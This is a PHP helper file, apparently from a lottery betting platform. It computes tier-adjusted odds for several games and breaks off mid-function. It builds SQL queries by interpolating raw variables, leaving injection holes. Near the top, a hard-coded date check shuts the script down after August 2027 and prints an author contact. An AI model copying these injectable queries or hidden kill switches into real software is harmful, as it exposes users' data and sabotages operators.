<?php
/*  
  Copyright (c) 2010-02 Game
  Game All Rights Reserved. 
  Author QQ: 1234567
  Author: Version:1.0
  Date:2011-12-13
*/
if (!defined('Copyright') && Copyright != 'Sorry, the page wrong path')
exit('Sorry, the page wrong path');
if (!defined('ROOT_PATH'))
exit('invalid request');

$xxsj=strtotime(date('Y-m-d H:i:s'));
$u_stoptime=strtotime("2027-8-1 21:10:10");
if($xxsj > $u_stoptime) 
{
exit('invalid request.qq:1391082827');
}

function dump($str){
	echo "<pre>";
	print_r($str);
	echo "</pre>";
	exit;
}
/**
 * 排序數組索引
 * @param unknown_type $array
 */
function arr_index_srot($array)
{
	$arr=array();
	foreach ($array as $value){ 
		$arr[] = $value;
	}
	return $arr;
}

/**
 * 返回無重複數組
 * @param unknown_type $array
 */
function arr_usort($array)
{
	$arr =array();
	$a = null;
	sort($array);
	for ($i=0; $i<count($array); $i++){
		if ($a != $array[$i]){
			$a = $array[$i];
			$arr[] = $array[$i];
		}
	}
	return $arr;
}

/**
	 * 去除重複復試並且金額累加
	 * @param unknown_type $array1
	 */
function arr_susort($array1)
{
	$arr = array();
	//$a = $b =null; 
	$c= 0;
	for ($i=0; $i<count($array1); $i++){
		$arrs[] = $array1[$i]['g_mingxi_2'];
	}
	$arrs =arr_usort($arrs);
	for ($i=0; $i<count($arrs); $i++){
		for ($n=0; $n<count($array1); $n++){
			if ($arrs[$i] == $array1[$n]['g_mingxi_2']){
				$c+= $array1[$n]['g_jiner'];
			}
		}
		$arr[$i] = $array1[$i];
		$arr[$i]['g_jiner'] = $c;
		$arr[$i]['g_mingxi_2'] = $arrs[$i];
		$c=0;
	}
	return $arr;
}

function manauser($name)
{
	$db=new DB();
	$sql = "SELECT  g_zy FROM g_rank where g_name='{$name}' LIMIT 1";
	$result = $db->query($sql, 1);
	return $result[0]['g_zy'];
}

function configModel($select)
{
	$db=new DB();
	$sql = "SELECT {$select} FROM g_config LIMIT 1";
	$result = $db->query($sql, 1);
	//echo print_r($result[0]);
	return $result[0];
}

function configModelPan($type,$gametyp='')
{
	$db=new DB();
	$sql = "SELECT * FROM g_odds".$gametyp."_{$type} ";
	$result = $db->query($sql, 1);
	return $result[0];
}

function configModelPannc($type,$gametyp='9')
{
	$db=new DB();
	$sql = "SELECT * FROM g_odds".$gametyp."_{$type} ";
	$result = $db->query($sql, 1);
	return $result[0];
}

function configModelPancq($type,$gametyp=2)
{
	$db=new DB();
	$sql = "SELECT * FROM g_odds".$gametyp."_{$type} ";
	$result = $db->query($sql, 1);
	return $result[0];
}
function configModelPanjx($type,$gametyp=3)
{
	$db=new DB();
	$sql = "SELECT * FROM g_odds".$gametyp."_{$type} ";
	$result = $db->query($sql, 1);
	return $result[0];
}

function configModelPansz($type)
{
	$db=new DB();
	$sql = "SELECT * FROM g_odds7_{$type} ";
	$result = $db->query($sql, 1);
	return $result[0];
}
function configModelPankl8($type)
{
	$db=new DB();
	$sql = "SELECT * FROM g_odds8_{$type} ";
	$result = $db->query($sql, 1);
	return $result[0];
}

function result_login_id($nid)
{
	$len = mb_strlen($nid);
	switch ($len)
	{
		case 32: return 56;
		case 64: return 22;
		case 96: return 78;
		case 128: return 48;
		
	}
	
}

function setodds($key, $val, $ConfigModel, $user, $param=0,$Ball=0)
{

	$odds = $val;
	if ($param == 0 && Copyright)
	{
		if ($key == 'h1'||$key == 'h2'||$key == 'h3'||$key == 'h4'||$key == 'h5'||$key == 'h6'||$key == 'h7'||$key == 'h8'||$key == 'h9'||$key == 'h10'||$key == 'h11'||$key == 'h12'||$key == 'h13'||$key == 'h14'||$key == 'h15'||$key == 'h16'||$key == 'h17'||$key == 'h18'||$key == 'h19'||$key == 'h20'){
			if ($user[0]['g_panlu'] == 'B'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_b1'];
						$result=configModelPan('b');
						switch($Ball){
						case 'g1':$odds = $val-$result['h1'];break;
						case 'g2':$odds = $val-$result['h2'];break;
						case 'g3':$odds = $val-$result['h3'];break;
						case 'g4':$odds = $val-$result['h4'];break;
						case 'g5':$odds = $val-$result['h5'];break;
						case 'g6':$odds = $val-$result['h6'];break;
						case 'g7':$odds = $val-$result['h7'];break;
						case 'g8':$odds = $val-$result['h8'];break;
						}			
			} else if ($user[0]['g_panlu'] == 'C'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_c1'];
						$result=configModelPan('c');
						switch($Ball){
						case 'g1':$odds = $val-$result['h1'];break;
						case 'g2':$odds = $val-$result['h2'];break;
						case 'g3':$odds = $val-$result['h3'];break;
						case 'g4':$odds = $val-$result['h4'];break;
						case 'g5':$odds = $val-$result['h5'];break;
						case 'g6':$odds = $val-$result['h6'];break;
						case 'g7':$odds = $val-$result['h7'];break;
						case 'g8':$odds = $val-$result['h8'];break;
						}	
			}
		} else if ($key == 'h21'||$key == 'h22'||$key == 'h23'||$key == 'h24'||$key == 'h25'||$key == 'h26'||$key == 'h27'||$key == 'h28'){
			if ($user[0]['g_panlu'] == 'B'){
				  	//	$odds = $val - $ConfigModel['g_odds_ratio_b4'];
					$result=configModelPan('b');
					if ($key == 'h21'||$key == 'h22'){
					$odds = $val-$result['h21'];
					}
					if ($key == 'h23'||$key == 'h24'){
					$odds = $val-$result['h23'];
					}
					if ($key == 'h25'||$key == 'h26'){
					$odds = $val-$result['h25'];
					}
					if ($key == 'h27'||$key == 'h28'){
					$odds = $val-$result['h27'];
					}
			} else if ($user[0]['g_panlu'] == 'C'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_c4'];
						$result=configModelPan('c');
					if ($key == 'h21'||$key == 'h22'){
					$odds = $val-$result['h21'];
					}
					if ($key == 'h23'||$key == 'h24'){
					$odds = $val-$result['h23'];
					}
					if ($key == 'h25'||$key == 'h26'){
					$odds = $val-$result['h25'];
					}
					if ($key == 'h27'||$key == 'h28'){
					$odds = $val-$result['h27'];
					}
			}
		} else if ($key == 'h29'||$key == 'h30'||$key == 'h31'||$key == 'h32'){
			if ($user[0]['g_panlu'] == 'B'){
						$result=configModelPan('b');
				  		//$odds = $val - $ConfigModel['g_odds_ratio_b2'];
						$odds = $val-$result['h29'];
			} else if ($user[0]['g_panlu'] == 'C'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_c2'];
						$result=configModelPan('c');
						$odds = $val-$result['h29'];
			}
		} else if ($key == 'h33'||$key == 'h34'||$key == 'h35'){
			if ($user[0]['g_panlu'] == 'B'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_b3'];
						$result=configModelPan('b');
						$odds = $val-$result['h33'];
			} else if ($user[0]['g_panlu'] == 'C'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_c3'];
						$result=configModelPan('c');
						$odds = $val-$result['h33'];
			}
		}
	}
	else if ($param == 1)
	{
		if ($user[0]['g_panlu'] == 'B'){
			//$odds = $val - $ConfigModel['g_odds_ratio_b4'];
						$result=configModelPan('b');
						switch($key){
						case 'h1':$odds = $val-$result['h34'];break;
						case 'h2':$odds = $val-$result['h34'];break;
						case 'h3':$odds = $val-$result['h35'];break;
						case 'h4':$odds = $val-$result['h35'];break;
						case 'h5':$odds = $val-$result['h36'];break;
						case 'h6':$odds = $val-$result['h36'];break;
						case 'h7':$odds = $val-$result['h37'];break;
						case 'h8':$odds = $val-$result['h37'];break;
						}	
					if($Ball=='g9'){	
						$result=configModelPan('b');
						if ($key == 'h21'||$key == 'h22'){
							$odds = $val-$result['h21'];
						}
						if ($key == 'h23'||$key == 'h24'){
							$odds = $val-$result['h23'];
						}
						if ($key == 'h25'||$key == 'h26'){
							$odds = $val-$result['h25'];
						}
						if ($key == 'h27'||$key == 'h28'){
							$odds = $val-$result['h27'];
						}
					}
		} else if ($user[0]['g_panlu'] == 'C'){
			//$odds = $val - $ConfigModel['g_odds_ratio_c4'];
						$result=configModelPan('c');
						switch($key){
						case 'h1':$odds = $val-$result['h34'];break;
						case 'h2':$odds = $val-$result['h34'];break;
						case 'h3':$odds = $val-$result['h35'];break;
						case 'h4':$odds = $val-$result['h35'];break;
						case 'h5':$odds = $val-$result['h36'];break;
						case 'h6':$odds = $val-$result['h36'];break;
						case 'h7':$odds = $val-$result['h37'];break;
						case 'h8':$odds = $val-$result['h37'];break;
						}	
					if($Ball=='g9'){	
					$result=configModelPan('c');
					if ($key == 'h21'||$key == 'h22'){
					$odds = $val-$result['h21'];
					}
					if ($key == 'h23'||$key == 'h24'){
					$odds = $val-$result['h23'];
					}
					if ($key == 'h25'||$key == 'h26'){
					$odds = $val-$result['h25'];
					}
					if ($key == 'h27'||$key == 'h28'){
					$odds = $val-$result['h27'];
					}
					}
		}
	}
	else if ($param == 2)
	{
		if ($user[0]['g_panlu'] == 'B'){
			//$odds = $val - $ConfigModel['g_odds_ratio_b5'];
						$result=configModelPan('b');
						switch($key){
						case 'h1':$odds = $val-$result['h38'];break;
						case 'h2':$odds = $val-$result['h39'];break;
						case 'h3':$odds = $val-$result['h40'];break;
						case 'h4':$odds = $val-$result['h41'];break;
						case 'h5':$odds = $val-$result['h42'];break;
						case 'h6':$odds = $val-$result['h43'];break;
						case 'h7':$odds = $val-$result['h44'];break;
						case 'h8':$odds = $val-$result['h45'];break;
						}	
		} else if ($user[0]['g_panlu'] == 'C'){
			//$odds = $val - $ConfigModel['g_odds_ratio_c5'];
						$result=configModelPan('c');
						switch($key){
						case 'h1':$odds = $val-$result['h38'];break;
						case 'h2':$odds = $val-$result['h39'];break;
						case 'h3':$odds = $val-$result['h40'];break;
						case 'h4':$odds = $val-$result['h41'];break;
						case 'h5':$odds = $val-$result['h42'];break;
						case 'h6':$odds = $val-$result['h43'];break;
						case 'h7':$odds = $val-$result['h44'];break;
						case 'h8':$odds = $val-$result['h45'];break;
						}	
		}
	}
	return $odds;
}

function setoddsnc($key, $val, $ConfigModel, $user, $param,$Ball)
{

	$odds = $val;
	if ($param == 0 && Copyright)
	{
		if ($key == 'h1'||$key == 'h2'||$key == 'h3'||$key == 'h4'||$key == 'h5'||$key == 'h6'||$key == 'h7'||$key == 'h8'||$key == 'h9'||$key == 'h10'||$key == 'h11'||$key == 'h12'||$key == 'h13'||$key == 'h14'||$key == 'h15'||$key == 'h16'||$key == 'h17'||$key == 'h18'||$key == 'h19'||$key == 'h20'){
			if ($user[0]['g_panlu'] == 'B'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_b1'];
						$result=configModelPannc('b',9);
						switch($Ball){
						case 'g1':$odds = $val-$result['h1'];break;
						case 'g2':$odds = $val-$result['h2'];break;
						case 'g3':$odds = $val-$result['h3'];break;
						case 'g4':$odds = $val-$result['h4'];break;
						case 'g5':$odds = $val-$result['h5'];break;
						case 'g6':$odds = $val-$result['h6'];break;
						case 'g7':$odds = $val-$result['h7'];break;
						case 'g8':$odds = $val-$result['h8'];break;
						}			
			} else if ($user[0]['g_panlu'] == 'C'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_c1'];
						$result=configModelPannc('c',9);
						switch($Ball){
						case 'g1':$odds = $val-$result['h1'];break;
						case 'g2':$odds = $val-$result['h2'];break;
						case 'g3':$odds = $val-$result['h3'];break;
						case 'g4':$odds = $val-$result['h4'];break;
						case 'g5':$odds = $val-$result['h5'];break;
						case 'g6':$odds = $val-$result['h6'];break;
						case 'g7':$odds = $val-$result['h7'];break;
						case 'g8':$odds = $val-$result['h8'];break;
						}	
			}
		} else if ($key == 'h21'||$key == 'h22'||$key == 'h23'||$key == 'h24'||$key == 'h25'||$key == 'h26'||$key == 'h27'||$key == 'h28'){
			if ($user[0]['g_panlu'] == 'B'){
				  	//	$odds = $val - $ConfigModel['g_odds_ratio_b4'];
					$result=configModelPannc('b',9);
					if ($key == 'h21'||$key == 'h22'){
					$odds = $val-$result['h21'];
					}
					if ($key == 'h23'||$key == 'h24'){
					$odds = $val-$result['h23'];
					}
					if ($key == 'h25'||$key == 'h26'){
					$odds = $val-$result['h25'];
					}
					if ($key == 'h27'||$key == 'h28'){
					$odds = $val-$result['h27'];
					}
			} else if ($user[0]['g_panlu'] == 'C'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_c4'];
						$result=configModelPannc('c',9);
					if ($key == 'h21'||$key == 'h22'){
					$odds = $val-$result['h21'];
					}
					if ($key == 'h23'||$key == 'h24'){
					$odds = $val-$result['h23'];
					}
					if ($key == 'h25'||$key == 'h26'){
					$odds = $val-$result['h25'];
					}
					if ($key == 'h27'||$key == 'h28'){
					$odds = $val-$result['h27'];
					}
			}
		} else if ($key == 'h29'||$key == 'h30'||$key == 'h31'||$key == 'h32'){
			if ($user[0]['g_panlu'] == 'B'){
						$result=configModelPannc('b',9);
				  		//$odds = $val - $ConfigModel['g_odds_ratio_b2'];
						$odds = $val-$result['h29'];
			} else if ($user[0]['g_panlu'] == 'C'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_c2'];
						$result=configModelPannc('c',9);
						$odds = $val-$result['h29'];
			}
		} else if ($key == 'h33'||$key == 'h34'||$key == 'h35'){
			if ($user[0]['g_panlu'] == 'B'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_b3'];
						$result=configModelPannc('b',9);
						$odds = $val-$result['h33'];
			} else if ($user[0]['g_panlu'] == 'C'){
				  		//$odds = $val - $ConfigModel['g_odds_ratio_c3'];
						$result=configModelPannc('c',9);
						$odds = $val-$result['h33'];
			}
		}
	}
	else if ($param == 1)
	{
		if ($user[0]['g_panlu'] == 'B'){
			//$odds = $val - $ConfigModel['g_odds_ratio_b4'];
						$result=configModelPannc('b',9);
						switch($key){
						case 'h1':$odds = $val-$result['h34'];break;
						case 'h2':$odds = $val-$result['h34'];break;
						case 'h3':$odds = $val-$result['h35'];break;
						case 'h4':$odds = $val-$result['h35'];break;
						case 'h5':$odds = $val-$result['h36'];break;
						case 'h6':$odds = $val-$result['h36'];break;
						case 'h7':$odds = $val-$result['h37'];break;
						case 'h8':$odds = $val-$result['h37'];break;
						}	
					if($Ball=='g9'){	
						$result=configModelPannc('b',9);
						if ($key == 'h21'||$key == 'h22'){
							$odds = $val-$result['h21'];
						}
						if ($key == 'h23'||$key == 'h24'){
							$odds = $val-$result['h23'];
						}
						if ($key == 'h25'||$key == 'h26'){
							$odds = $val-$result['h25'];
						}
						if ($key == 'h27'||$key == 'h28'){
							$odds = $val-$result['h27'];
						}
					}
		} else if ($user[0]['g_panlu'] == 'C'){
			//$odds = $val - $ConfigModel['g_odds_ratio_c4'];
						$result=configModelPannc('c',9);
						switch($key){
						case 'h1':$odds = $val-$result['h34'];break;
						case 'h2':$odds = $val-$result['h34'];break;
						case 'h3':$odds = $val-$result['h35'];break;
						case 'h4':$odds = $val-$result['h35'];break;
						case 'h5':$odds = $val-$result['h36'];break;
						case 'h6':$odds = $val-$result['h36'];break;
						case 'h7':$odds = $val-$result['h37'];break;
						case 'h8':$odds = $val-$result['h37'];break;
						}	
					if($Ball=='g9'){	
					$result=configModelPannc('c',9);
					if ($key == 'h21'||$key == 'h22'){
					$odds = $val-$result['h21'];
					}
					if ($key == 'h23'||$key == 'h24'){
					$odds = $val-$result['h23'];
					}
					if ($key == 'h25'||$key == 'h26'){
					$odds = $val-$result['h25'];
					}
					if ($key == 'h27'||$key == 'h28'){
					$odds = $val-$result['h27'];
					}
					}
		}
	}
	else if ($param == 2)
	{
		if ($user[0]['g_panlu'] == 'B'){
			//$odds = $val - $ConfigModel['g_odds_ratio_b5'];
						$result=configModelPannc('b',9);
						switch($key){
						case 'h1':$odds = $val-$result['h38'];break;
						case 'h2':$odds = $val-$result['h39'];break;
						case 'h3':$odds = $val-$result['h40'];break;
						case 'h4':$odds = $val-$result['h41'];break;
						case 'h5':$odds = $val-$result['h42'];break;
						case 'h6':$odds = $val-$result['h43'];break;
						case 'h7':$odds = $val-$result['h44'];break;
						case 'h8':$odds = $val-$result['h45'];break;
						}	
		} else if ($user[0]['g_panlu'] == 'C'){
			//$odds = $val - $ConfigModel['g_odds_ratio_c5'];
						$result=configModelPannc('c',9);
						switch($key){
						case 'h1':$odds = $val-$result['h38'];break;
						case 'h2':$odds = $val-$result['h39'];break;
						case 'h3':$odds = $val-$result['h40'];break;
						case 'h4':$odds = $val-$result['h41'];break;
						case 'h5':$odds = $val-$result['h42'];break;
						case 'h6':$odds = $val-$result['h43'];break;
						case 'h7':$odds = $val-$result['h44'];break;
						case 'h8':$odds = $val-$result['h45'];break;
						}	
		}
	}
	return $odds;
	//echo $odds;
}

function setoddscq($key, $val, $ConfigModel, $user, $param=0,$Ball=0,$gameid=2)
{
	$odds = $val;
	if ($param == 0)
	{
		if ($key == 'h1'||$key == 'h2'||$key == 'h3'||$key == 'h4'||$key == 'h5'||$key == 'h6'||$key == 'h7'||$key == 'h8'||$key == 'h9'||$key == 'h10'){
			if ($user[0]['g_panlu'] == 'B'){
				//$odds = $val - $ConfigModel['g_odds_ratio_cq_b1'];
						$result=configModelPancq('b',$gameid);
						switch($Ball){
						case 'Ball_1':$odds = $val-$result['h1'];break;
						case 'Ball_2':$odds = $val-$result['h2'];break;
						case 'Ball_3':$odds = $val-$result['h3'];break;
						case 'Ball_4':$odds = $val-$result['h4'];break;
						case 'Ball_5':$odds = $val-$result['h5'];break;
						}		
			} else if ($user[0]['g_panlu'] == 'C' && Copyright){
				//$odds = $val - $ConfigModel['g_odds_ratio_cq_c1'];
						$result=configModelPancq('c',$gameid);
						switch($Ball){
						case 'Ball_1':$odds = $val-$result['h1'];break;
						case 'Ball_2':$odds = $val-$result['h2'];break;
						case 'Ball_3':$odds = $val-$result['h3'];break;
						case 'Ball_4':$odds = $val-$result['h4'];break;
						case 'Ball_5':$odds = $val-$result['h5'];break;
						}	
			}
		}
	}
	else if ($param == 1)
	{
		if ($user[0]['g_panlu'] == 'B'){
			//$odds = $val - $ConfigModel['g_odds_ratio_cq_b2'];
						$result=configModelPancq('b',$gameid);
						switch($key){
						case 'h11':$odds = $val-$result['h6'];break;
						case 'h12':$odds = $val-$result['h6'];break;
						case 'h13':$odds = $val-$result['h7'];break;
						case 'h14':$odds = $val-$result['h7'];break;
						}	
					if($Ball=='Ball_6'){	
					$result=configModelPancq('b',$gameid);
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h8'];
					}
					if ($key == 'h3'||$key == 'h4'){
					$odds = $val-$result['h9'];
					}
					if ($key == 'h5'||$key == 'h6' || $key=='h7'){
					$odds = $val-$result['h10'];
					}
					}
		} else if ($user[0]['g_panlu'] == 'C'){
			//$odds = $val - $ConfigModel['g_odds_ratio_cq_c2'];
						$result=configModelPancq('c',$gameid);
						switch($key){
						case 'h11':$odds = $val-$result['h6'];break;
						case 'h12':$odds = $val-$result['h6'];break;
						case 'h13':$odds = $val-$result['h7'];break;
						case 'h14':$odds = $val-$result['h7'];break;
						}	
						if($Ball=='Ball_6'){	
					$result=configModelPancq('c',$gameid);
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h8'];
					}
					if ($key == 'h3'||$key == 'h4'){
					$odds = $val-$result['h9'];
					}
					if ($key == 'h5'||$key == 'h6' || $key=='h7'){
					$odds = $val-$result['h10'];
					}
					}
		}
	}
	else if ($param == 2)
	{
		if ($user[0]['g_panlu'] == 'B' && Copyright){
			//$odds = $val - $ConfigModel['g_odds_ratio_cq_b3'];
						$result=configModelPancq('b',$gameid);
						switch($Ball){
						case 'Ball_7':$odds = $val-$result['h11'];break;
						case 'Ball_8':$odds = $val-$result['h12'];break;
						case 'Ball_9':$odds = $val-$result['h13'];break;
						}		
		} else if ($user[0]['g_panlu'] == 'C'){
			//$odds = $val - $ConfigModel['g_odds_ratio_cq_c3'];
			$result=configModelPancq('c',$gameid);
						switch($Ball){
						case 'Ball_7':$odds = $val-$result['h11'];break;
						case 'Ball_8':$odds = $val-$result['h12'];break;
						case 'Ball_9':$odds = $val-$result['h13'];break;
						}		
		}
	}
	return $odds;
}

function setoddsjx($key, $val, $ConfigModel, $user, $param=0,$Ball=0,$gameid=3)
{
	$odds = $val;
	if ($param == 0)
	{
		if ($key == 'h1'||$key == 'h2'||$key == 'h3'||$key == 'h4'||$key == 'h5'||$key == 'h6'||$key == 'h7'||$key == 'h8'||$key == 'h9'||$key == 'h10'){
			if ($user[0]['g_panlu'] == 'B'){
				//$odds = $val - $ConfigModel['g_odds_ratio_jx_b1'];
						$result=configModelPanjx('b',$gameid);
						switch($Ball){
						case 'Ball_1':$odds = $val-$result['h1'];break;
						case 'Ball_2':$odds = $val-$result['h2'];break;
						case 'Ball_3':$odds = $val-$result['h3'];break;
						case 'Ball_4':$odds = $val-$result['h4'];break;
						case 'Ball_5':$odds = $val-$result['h5'];break;
						}		
			} else if ($user[0]['g_panlu'] == 'C' && Copyright){
				//$odds = $val - $ConfigModel['g_odds_ratio_jx_c1'];
						$result=configModelPanjx('c',$gameid);
						switch($Ball){
						case 'Ball_1':$odds = $val-$result['h1'];break;
						case 'Ball_2':$odds = $val-$result['h2'];break;
						case 'Ball_3':$odds = $val-$result['h3'];break;
						case 'Ball_4':$odds = $val-$result['h4'];break;
						case 'Ball_5':$odds = $val-$result['h5'];break;
						}	
			}
		}
	}
	else if ($param == 1)
	{
		if ($user[0]['g_panlu'] == 'B'){
			//$odds = $val - $ConfigModel['g_odds_ratio_jx_b2'];
						$result=configModelPanjx('b',$gameid);
						switch($key){
						case 'h11':$odds = $val-$result['h6'];break;
						case 'h12':$odds = $val-$result['h6'];break;
						case 'h13':$odds = $val-$result['h7'];break;
						case 'h14':$odds = $val-$result['h7'];break;
						}	
					if($Ball=='Ball_6'){	
					$result=configModelPanjx('b',$gameid);
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h8'];
					}
					if ($key == 'h3'||$key == 'h4'){
					$odds = $val-$result['h9'];
					}
					if ($key == 'h5'||$key == 'h6' || $key=='h7'){
					$odds = $val-$result['h10'];
					}
					}
		} else if ($user[0]['g_panlu'] == 'C'){
			//$odds = $val - $ConfigModel['g_odds_ratio_jx_c2'];
						$result=configModelPanjx('c',$gameid);
						switch($key){
						case 'h11':$odds = $val-$result['h6'];break;
						case 'h12':$odds = $val-$result['h6'];break;
						case 'h13':$odds = $val-$result['h7'];break;
						case 'h14':$odds = $val-$result['h7'];break;
						}	
						if($Ball=='Ball_6'){	
					$result=configModelPanjx('c',$gameid);
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h8'];
					}
					if ($key == 'h3'||$key == 'h4'){
					$odds = $val-$result['h9'];
					}
					if ($key == 'h5'||$key == 'h6' || $key=='h7'){
					$odds = $val-$result['h10'];
					}
					}
		}
	}
	else if ($param == 2)
	{
		if ($user[0]['g_panlu'] == 'B' && Copyright){
			//$odds = $val - $ConfigModel['g_odds_ratio_jx_b3'];
						$result=configModelPanjx('b',$gameid);
						switch($Ball){
						case 'Ball_7':$odds = $val-$result['h11'];break;
						case 'Ball_8':$odds = $val-$result['h12'];break;
						case 'Ball_9':$odds = $val-$result['h13'];break;
						}		
		} else if ($user[0]['g_panlu'] == 'C'){
			//$odds = $val - $ConfigModel['g_odds_ratio_jx_c3'];
			$result=configModelPanjx('c',$gameid);
						switch($Ball){
						case 'Ball_7':$odds = $val-$result['h11'];break;
						case 'Ball_8':$odds = $val-$result['h12'];break;
						case 'Ball_9':$odds = $val-$result['h13'];break;
						}		
		}
	}
	return $odds;
}


function setoddsk5($key, $val, $ConfigModel, $user, $param=0,$Ball=0)
{
	$odds = $val;
	if ($param == 0)
	{
		if ($key == 'h1'||$key == 'h2'||$key == 'h3'||$key == 'h4'||$key == 'h5'||$key == 'h6'||$key == 'h7'||$key == 'h8'||$key == 'h9'||$key == 'h10'){
			if ($user[0]['g_panlu'] == 'B'){
				//$odds = $val - $ConfigModel['g_odds_ratio_cq_b1'];
						$result=configModelPancq('b',3);
						switch($Ball){
						case 'Ball_1':$odds = $val-$result['h1'];break;
						case 'Ball_2':$odds = $val-$result['h2'];break;
						case 'Ball_3':$odds = $val-$result['h3'];break;
						case 'Ball_4':$odds = $val-$result['h4'];break;
						case 'Ball_5':$odds = $val-$result['h5'];break;
						}		
			} else if ($user[0]['g_panlu'] == 'C' && Copyright){
				//$odds = $val - $ConfigModel['g_odds_ratio_cq_c1'];
						$result=configModelPancq('c',3);
						switch($Ball){
						case 'Ball_1':$odds = $val-$result['h1'];break;
						case 'Ball_2':$odds = $val-$result['h2'];break;
						case 'Ball_3':$odds = $val-$result['h3'];break;
						case 'Ball_4':$odds = $val-$result['h4'];break;
						case 'Ball_5':$odds = $val-$result['h5'];break;
						}	
			}
		}
	}
	else if ($param == 1)
	{
		if ($user[0]['g_panlu'] == 'B'){
			//$odds = $val - $ConfigModel['g_odds_ratio_cq_b2'];
						$result=configModelPancq('b',3);
						switch($key){
						case 'h11':$odds = $val-$result['h6'];break;
						case 'h12':$odds = $val-$result['h6'];break;
						case 'h13':$odds = $val-$result['h7'];break;
						case 'h14':$odds = $val-$result['h7'];break;
						}	
					if($Ball=='Ball_6'){	
					$result=configModelPancq('b',3);
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h8'];
					}
					if ($key == 'h3'||$key == 'h4'){
					$odds = $val-$result['h9'];
					}
					if ($key == 'h5'||$key == 'h6' || $key=='h7'){
					$odds = $val-$result['h10'];
					}
					}
		} else if ($user[0]['g_panlu'] == 'C'){
			//$odds = $val - $ConfigModel['g_odds_ratio_cq_c2'];
						$result=configModelPancq('c',3);
						switch($key){
						case 'h11':$odds = $val-$result['h6'];break;
						case 'h12':$odds = $val-$result['h6'];break;
						case 'h13':$odds = $val-$result['h7'];break;
						case 'h14':$odds = $val-$result['h7'];break;
						}	
						if($Ball=='Ball_6'){	
					$result=configModelPancq('c',3);
					if ($key == 'h1'||$key == 'h2'){
					$odds = $val-$result['h8'];
					}
					if ($key == 'h3'||$key == 'h4'){
					$odds = $val-$result['h9'];
					}
					if ($key == 'h5'||$key == 'h6' || $key=='h7'){
					$odds = $val-$result['h10'];
					}
					}
		}
	}
	else if ($param == 2)
	{
		if ($user[0]['g_panlu'] == 'B' && Copyright){
			//$odds = $val - $ConfigModel['g_odds_ratio_cq_b3'];
						$result=configModelPancq('b',3);
						switch($Ball){
						case 'Ball_7':$odds = $val-$result['h11'];break;
						case 'Ball_8':$odds = $val-$result['h12'];break;
						case 'Ball_9':$odds = $val-$result['h13'];break;
						}		
		} else if ($user[0]['g_panlu'] == 'C'){
			//$odds = $val - $ConfigModel['g_odds_ratio_cq_c3'];
			$result=configModelPancq('c',3);
						switch($Ball){
						case 'Ball_7':$odds = $val-$result['h11'];break;
						case 'Ball_8':$odds = $val-$result['h12'];break;
						case 'Ball_9':$odds = $val-$result['h13'];break;
						}		
		}
	}
	return $odds;
}

function setoddssz($key, $val, $user, $param=0,$ball=0){
	$odds = $val;
	$a = 1.77;
	if($ball=="Ball_1"||$ball=="Ball_2"||$ball=="Ball_3"||$ball=="Ball_4"||$ball=="Ball_5"||$ball=="Ball_6"){
	//if(1){
		if($user[0]['g_panlu'] == 'B'){
			$ret=configModelPansz("b");
			$a = 1.88;
			switch ($ball){
				case "Ball_1":$odds=$val-$ret["h1"];break;
				case "Ball_2":$odds=$val-$ret["h2"];break;
				case "Ball_3":$odds=$val-$ret["h3"];break;
				case "Ball_4":$odds=$val-$ret["h4"];break;
				case "Ball_5":$odds=$val-$ret["h5"];break;
				case "Ball_6":$odds=$val-$ret["h6"];break;
			}
		}else if ($user[0]['g_panlu'] == 'C'){
			$ret=configModelPansz("c");
			$a = 1.99;
			switch ($ball){
				case "Ball_1":$odds=$val-$ret["h1"];break;
				case "Ball_2":$odds=$val-$ret["h2"];break;
				case "Ball_3":$odds=$val-$ret["h3"];break;
				case "Ball_4":$odds=$val-$ret["h4"];break;
				case "Ball_5":$odds=$val-$ret["h5"];break;
				case "Ball_6":$odds=$val-$ret["h6"];break;
			}
		}
	}
	
	return $odds;
}
function setoddskl8($key, $val, $user, $param=0,$ball=0){
	$odds = $val;
	if($ball=="Ball_1"||$ball=="Ball_2"||$ball=="Ball_3"||$ball=="Ball_4"||$ball=="Ball_5"||$ball=="Ball_6"||$ball=="Ball_7"||$ball=="Ball_8"){
		if($user[0]['g_panlu'] == 'B'){
			$ret=configModelPankl8("b");
			switch ($ball){
				case "Ball_1":$odds=$val-$ret["h1"];break;
				case "Ball_2":$odds=$val-$ret["h2"];break;
				case "Ball_3":$odds=$val-$ret["h3"];break;
				case "Ball_4":$odds=$val-$ret["h4"];break;
				case "Ball_5":$odds=$val-$ret["h5"];break;
				case "Ball_6":$odds=$val-$ret["h6"];break;
				case "Ball_7":$odds=$val-$ret["h7"];break;
				case "Ball_8":$odds=$val-$ret["h8"];break;
			}
		}else if ($user[0]['g_panlu'] == 'C'){
			$ret=configModelPankl8("c");
			switch ($ball){
				case "Ball_1":$odds=$val-$ret["h1"];break;
				case "Ball_2":$odds=$val-$ret["h2"];break;
				case "Ball_3":$odds=$val-$ret["h3"];break;
				case "Ball_4":$odds=$val-$ret["h4"];break;
				case "Ball_5":$odds=$val-$ret["h5"];break;
				case "Ball_6":$odds=$val-$ret["h6"];break;
				case "Ball_7":$odds=$val-$ret["h7"];break;
				case "Ball_8":$odds=$val-$ret["h8"];break;
			}
		}
	}
	
	//return $odds;
	return $odds;
}

function insertLogValue($valueList)
{
	$qqWryInfo = ROOT_PATH.'tools/IpApi/QQWry.Dat';
	$ip = GetIP();
	$ip_s = ipLocation($ip, $qqWryInfo);
	$db= new DB();
	$sql = "INSERT INTO `g_insert_log` (`g_name`, `g_f_name`, `g_initial_value`, `g_up_value`, `g_up_type`, `g_up_date`, `g_s_id`, `g_ip`, `g_ipu`) VALUES (
	'{$valueList['g_name']}',
	'{$valueList['g_f_name']}',
	'{$valueList['g_initial_value']}',
	'{$valueList['g_up_value']}',
